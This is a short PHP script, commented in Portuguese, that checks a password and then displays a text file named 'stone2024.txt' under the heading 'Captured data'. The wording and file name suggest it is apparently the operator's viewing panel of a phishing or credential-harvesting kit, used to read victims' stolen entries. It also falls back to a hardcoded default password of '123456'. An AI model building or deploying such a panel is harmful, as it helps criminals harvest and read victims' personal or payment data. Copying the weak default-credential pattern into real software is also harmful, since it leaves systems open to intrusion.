<?php
// Lê a senha do ambiente (Render injeta automaticamente)
$senhaCorreta = $_ENV['ADMIN_PASS'] ?? '123456';

// Validação simples
if (($_POST['senha'] ?? '') !== $senhaCorreta) {
    http_response_code(403);
    die('Acesso negado.');
}

// Exibe os dados capturados
echo '<h2>Dados capturados:</h2><pre>';
if (file_exists('stone2024.txt')) {
    echo htmlspecialchars(file_get_contents('stone2024.txt'));
} else {
    echo 'Nenhum dado ainda.';
}
echo '</pre>';
?>
